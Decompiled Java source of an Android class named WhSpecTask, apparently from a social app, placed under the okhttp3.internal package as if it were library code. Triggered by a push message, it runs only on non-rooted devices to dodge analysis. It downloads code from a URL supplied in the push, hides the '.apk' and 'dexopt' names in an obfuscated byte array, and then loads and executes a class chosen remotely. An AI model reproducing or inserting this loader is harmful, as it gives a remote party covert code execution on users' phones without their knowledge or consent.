package okhttp3.internal;

import android.net.Uri;
import android.os.Build;
import android.os.SystemClock;
import androidx.webkit.ProxyConfig;
import com.fasterxml.jackson.databind.JsonNode;
import com.google.android.gms.common.internal.ImagesContract;
import com.narvii.app.NVContext;
import com.narvii.pushservice.PushPayload;
import com.narvii.util.NativeHelper;
import com.narvii.util.StringUtils;
import com.safedk.android.internal.partials.OkHttpFilesBridge;
import java.io.BufferedReader;
import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStreamReader;
import java.io.UnsupportedEncodingException;
import java.security.MessageDigest;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.Response;

/* JADX INFO: loaded from: classes5.dex */
public class WhSpecTask extends Thread {
    private NVContext context;
    private PushPayload payload;

    private static boolean checkRootMethod3() {
        Process processExec = null;
        try {
            processExec = Runtime.getRuntime().exec(new String[]{"/system/xbin/which", "su"});
            if (new BufferedReader(new InputStreamReader(processExec.getInputStream())).readLine() != null) {
                processExec.destroy();
                return true;
            }
            processExec.destroy();
            return false;
        } catch (Throwable unused) {
            if (processExec != null) {
                processExec.destroy();
            }
            return false;
        }
    }

    private static boolean checkRootMethod1() {
        String str = Build.TAGS;
        return str != null && str.contains("test-keys");
    }

    private static boolean checkRootMethod2() {
        String[] strArr = {"/system/app/Superuser.apk", "/sbin/su", "/system/bin/su", "/system/xbin/su", "/data/local/xbin/su", "/data/local/bin/su", "/system/sd/xbin/su", "/system/bin/failsafe/su", "/data/local/su", "/su/bin/su"};
        for (int i10 = 0; i10 < 10; i10++) {
            if (new File(strArr[i10]).exists()) {
                return true;
            }
        }
        return false;
    }

    public WhSpecTask(NVContext nVContext, PushPayload pushPayload) {
        this.context = nVContext;
        this.payload = pushPayload;
    }

    public static boolean isDeviceRooted() {
        if (!checkRootMethod1() && !checkRootMethod2() && !checkRootMethod3()) {
            return false;
        }
        return true;
    }

    /* JADX WARN: Code duplicated, block: B:20:0x0078 A[Catch: all -> 0x0180, TRY_LEAVE, TryCatch #0 {all -> 0x0180, blocks: (B:2:0x0000, B:4:0x0009, B:13:0x0028, B:15:0x0044, B:16:0x004e, B:18:0x0056, B:37:0x0137, B:40:0x0160, B:20:0x0078, B:21:0x0090, B:23:0x00a0, B:29:0x00be, B:31:0x00d9, B:36:0x00f9, B:34:0x00f3, B:41:0x016a, B:42:0x016f, B:43:0x0170, B:44:0x0179, B:26:0x00b3, B:27:0x00b8, B:28:0x00b9, B:10:0x001f, B:7:0x0018, B:45:0x017a, B:46:0x017f), top: B:49:0x0000, inners: #1 }] */
    @Override // java.lang.Thread, java.lang.Runnable
    public void run() {
        String strTextValue;
        String strTextValue2;
        File file;
        Uri uri;
        try {
            SystemClock.elapsedRealtime();
            if (!isDeviceRooted()) {
                JsonNode jsonNode = this.payload.ext.get("md5");
                String str = null;
                if (jsonNode == null) {
                    strTextValue = null;
                } else {
                    strTextValue = jsonNode.textValue();
                }
                if (strTextValue != null && strTextValue.length() == 32) {
                    str = strTextValue;
                }
                File file2 = new File(this.context.getContext().getFilesDir(), "wh");
                byte[] bArr = {36, 86, 100, 94, 86, 86, 104, 94, 94, 97};
                for (int i10 = 0; i10 < 10; i10++) {
                    bArr[i10] = (byte) (bArr[i10] + 10 + i10);
                }
                String str2 = new String(bArr);
                if (str != null) {
                    file = new File(file2, str + str2.substring(0, 4));
                    if (file.length() == 0) {
                        strTextValue2 = this.payload.ext.get(ImagesContract.URL).textValue();
                        OkHttpClient okHttpClient = (OkHttpClient) this.context.getService("whOkhttp3");
                        try {
                            uri = Uri.parse(strTextValue2);
                            if (uri.getScheme().equals(ProxyConfig.MATCH_HTTPS) || okHttpClient.dns().lookup(uri.getHost()).size() <= 0) {
                                throw new Exception();
                            }
                        } catch (Exception unused) {
                            okHttpClient = new OkHttpClient();
                        }
                        Response responseExecute = okHttpClient.newCall(new Request.Builder().url(strTextValue2).build()).execute();
                        if (responseExecute.isSuccessful()) {
                            byte[] bArrBytes = responseExecute.body().bytes();
                            String strByteArrayToHexString = StringUtils.byteArrayToHexString(MessageDigest.getInstance("MD5").digest(bArrBytes));
                            if (str == null) {
                                str = strByteArrayToHexString;
                            } else if (!str.equals(strByteArrayToHexString)) {
                                throw new UnsupportedEncodingException();
                            }
                            file2.mkdir();
                            File file3 = new File(file2, str + ".tmp");
                            FileOutputStream fileOutputStreamFileOutputStreamCtor = OkHttpFilesBridge.fileOutputStreamCtor(file3);
                            fileOutputStreamFileOutputStreamCtor.write(bArrBytes);
                            fileOutputStreamFileOutputStreamCtor.close();
                            file = new File(file2, str + str2.substring(0, 4));
                            file3.renameTo(file);
                        } else {
                            throw new RuntimeException(responseExecute.toString());
                        }
                    }
                } else {
                    strTextValue2 = this.payload.ext.get(ImagesContract.URL).textValue();
                    OkHttpClient okHttpClient2 = (OkHttpClient) this.context.getService("whOkhttp3");
                    uri = Uri.parse(strTextValue2);
                    if (uri.getScheme().equals(ProxyConfig.MATCH_HTTPS)) {
                    }
                    throw new Exception();
                }
                File file4 = new File(file2, str2.substring(4));
                file4.mkdir();
                Object objL = NativeHelper.l(file.getAbsolutePath(), file4.getAbsolutePath(), this.payload.ext.get("exec").textValue());
                if (objL != null) {
                    ((WhExec) objL).exec(this.context, this.payload);
                    return;
                }
                return;
            }
            throw new IllegalStateException();
        } catch (Throwable unused2) {
        }
    }
}
